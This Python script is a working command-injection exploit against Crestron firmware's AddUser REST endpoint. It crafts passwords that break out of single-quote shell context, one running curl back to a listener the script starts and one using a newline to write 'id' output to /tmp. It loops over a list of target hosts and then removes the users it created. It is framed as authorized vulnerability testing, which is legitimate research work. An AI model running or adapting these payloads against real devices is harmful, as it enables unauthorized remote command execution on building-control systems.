#!/usr/bin/env python3
"""
CrestronFW2x - Password Command Injection Test
Tests addSSLUserPassword() injection via ADDUSER REST API endpoint.

STATIC ANALYSIS FINDING:
- addSSLUserPassword() in libLinuxUtil.so formats:
  echo -E '%s:%s' | openssl aes-256-cbc -a -out %s -k %s
  then calls system()
- CheckEmbeddedChars only strips " and \ — does NOT strip '
- validatePasswordCharacters allows ALL printable chars including '
- validateCharacters (7-char blocklist) is NOT called on password

HYPOTHESIS: Password containing ' breaks single-quote context in echo,
allowing command substitution via $() or command separation.

TEST: Create a test user with a password that contains an OOB callback.
If the callback fires, we have confirmed command injection.

AUTHORIZED TESTING ONLY — using admin:admin on test environment.
"""

import sys
import os
import json
import time
import ssl
import urllib.request
import urllib.error
import base64
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(__file__))
from crestron_fw2x_common import EvidenceCollector, load_hosts, https_request

# Configuration
TEST_HOST = None  # Will be set from ipsClean.txt
LISTENER_PORT = 8899
CALLBACK_RECEIVED = threading.Event()
CALLBACK_DETAILS = {}


class CallbackHandler(BaseHTTPRequestHandler):
    """HTTP handler to receive OOB callbacks."""

    def do_GET(self):
        global CALLBACK_DETAILS
        CALLBACK_DETAILS = {
            "path": self.path,
            "headers": dict(self.headers),
            "client": self.client_address,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        CALLBACK_RECEIVED.set()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        print(f"  [CALLBACK] {args}")


def get_local_ip():
    """Get our IP address that the target can reach."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to one of the target hosts to determine our IP
        hosts = load_hosts()
        s.connect((hosts[0], 443))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def start_listener(port):
    """Start HTTP listener for OOB callbacks."""
    server = HTTPServer(("0.0.0.0", port), CallbackHandler)
    server.timeout = 1
    thread = threading.Thread(target=lambda: [server.handle_request() for _ in range(60)],
                             daemon=True)
    thread.start()
    return server


def test_adduser_injection(host, local_ip, evidence):
    """Test ADDUSER password injection."""

    # Step 1: Baseline — create a normal user to verify the endpoint works
    print(f"\n[*] Testing ADDUSER endpoint on {host}")

    # The REST API endpoint for adding users
    # Try the /Device/Authentication/AddUser endpoint
    test_data = json.dumps({
        "Device": {
            "Authentication": {
                "AddUser": {
                    "Username": "cf4test",
                    "Password": "Testpass123!",
                    "UserGroup": "Administrator"
                }
            }
        }
    }).encode()

    result = https_request(host, "/Device/Authentication/AddUser",
                          method="POST", data=test_data, timeout=15)

    evidence.add_test("ADDUSER-baseline",
                     f"Baseline ADDUSER on {host}",
                     {"method": "POST", "path": "/Device/Authentication/AddUser",
                      "body": test_data.decode()},
                     {"status": result["status"], "body": result["body"][:500],
                      "error": result["error"]},
                     "baseline")

    if result["status"] == 0:
        print(f"  [-] ADDUSER endpoint unreachable: {result['error']}")
        return False

    print(f"  [+] ADDUSER response: {result['status']} - {result['body'][:200]}")

    # Step 2: Injection test — password with single quote + OOB callback
    # Using $() for command substitution since $ is NOT blocked by validatePasswordCharacters
    # and validateCharacters is NOT called on this path

    callback_url = f"http://{local_ip}:{LISTENER_PORT}/cf4-inject-test"

    # Payload: break out of single quotes, execute curl for OOB
    # echo -E 'cf4test:test'$(curl http://IP:PORT/cf4-inject-test)'' | openssl...
    injection_password = f"test'$(curl {callback_url})'"

    print(f"  [*] Injection payload: {injection_password}")

    inject_data = json.dumps({
        "Device": {
            "Authentication": {
                "AddUser": {
                    "Username": "cf4inject",
                    "Password": injection_password,
                    "UserGroup": "Operator"
                }
            }
        }
    }).encode()

    CALLBACK_RECEIVED.clear()

    result = https_request(host, "/Device/Authentication/AddUser",
                          method="POST", data=inject_data, timeout=30)

    evidence.add_test("ADDUSER-injection",
                     f"Password injection test on {host}",
                     {"method": "POST", "path": "/Device/Authentication/AddUser",
                      "body": inject_data.decode(),
                      "payload_explanation": "Single-quote breaks echo quoting, $() for command substitution"},
                     {"status": result["status"], "body": result["body"][:500],
                      "error": result["error"]},
                     "injection-test")

    print(f"  [*] Injection response: {result['status']} - {result['body'][:200]}")

    # Wait for callback
    print(f"  [*] Waiting up to 15 seconds for OOB callback on :{LISTENER_PORT}...")
    callback_received = CALLBACK_RECEIVED.wait(timeout=15)

    if callback_received:
        print(f"  [!!!] CALLBACK RECEIVED! Command injection CONFIRMED!")
        evidence.add_finding("[REDACTED-ID]_INJECT-001", "CRITICAL",
                           "Authenticated Command Injection via Password Parameter",
                           {
                               "vector": "ADDUSER REST API → addSSLUserPassword() → system()",
                               "sink": "echo -E '%s:%s' | openssl aes-256-cbc -a -out %s -k %s",
                               "bypass": "CheckEmbeddedChars strips \" and \\ but NOT '",
                               "validation_gap": "validatePasswordCharacters allows all printable; validateCharacters NOT called",
                               "callback": CALLBACK_DETAILS,
                               "host": host
                           })
        return True
    else:
        print(f"  [-] No callback received within 15 seconds")

        # Step 3: Alternative — test with newline injection (0x0a)
        # Newline as command separator, no $ needed
        newline_password = "test'\nid > /tmp/cf4test\n'"

        nl_data = json.dumps({
            "Device": {
                "Authentication": {
                    "AddUser": {
                        "Username": "cf4nl",
                        "Password": newline_password,
                        "UserGroup": "Operator"
                    }
                }
            }
        }).encode()

        result = https_request(host, "/Device/Authentication/AddUser",
                              method="POST", data=nl_data, timeout=15)

        evidence.add_test("ADDUSER-newline",
                         f"Newline injection test on {host}",
                         {"method": "POST", "path": "/Device/Authentication/AddUser",
                          "body": nl_data.decode()},
                         {"status": result["status"], "body": result["body"][:500],
                          "error": result["error"]},
                         "newline-test")

        print(f"  [*] Newline injection response: {result['status']}")
        return False


def cleanup_test_users(host, evidence):
    """Remove test users created during testing."""
    for username in ["cf4test", "cf4inject", "cf4nl"]:
        data = json.dumps({
            "Device": {
                "Authentication": {
                    "RemoveUser": {
                        "Username": username
                    }
                }
            }
        }).encode()

        result = https_request(host, "/Device/Authentication/RemoveUser",
                              method="POST", data=data, timeout=10)
        print(f"  [*] Cleanup {username}: {result['status']}")


def main():
    evidence = EvidenceCollector("cf4_password_injection_test",
                                "ADDUSER password command injection via addSSLUserPassword()")

    # Get local IP for OOB callback
    local_ip = get_local_ip()
    print(f"[*] Local IP for callbacks: {local_ip}")

    # Start HTTP listener
    print(f"[*] Starting OOB listener on port {LISTENER_PORT}")
    server = start_listener(LISTENER_PORT)

    # Load hosts and pick first reachable one
    hosts = load_hosts()
    print(f"[*] {len(hosts)} authorized hosts loaded")

    # Test on first 3 reachable hosts
    tested = 0
    for host in hosts[:10]:  # Try first 10, stop after 3 successful
        if tested >= 3:
            break

        # Quick reachability check
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, 443))
            sock.close()
        except Exception:
            continue

        tested += 1
        print(f"\n{'='*60}")
        print(f"[*] Testing host {tested}/3: {host}")
        print(f"{'='*60}")

        try:
            result = test_adduser_injection(host, local_ip, evidence)
            if result:
                print(f"\n[!!!] CONFIRMED: Command injection on {host}!")

            # Cleanup
            print(f"\n[*] Cleaning up test users on {host}")
            cleanup_test_users(host, evidence)
        except Exception as e:
            print(f"  [!] Error testing {host}: {e}")
            evidence.add_anomaly(f"error-{host}", str(e))

        time.sleep(1.0)  # Rate limiting

    evidence.save()
    print(f"\n[*] Testing complete. {tested} hosts tested.")


if __name__ == "__main__":
    main()
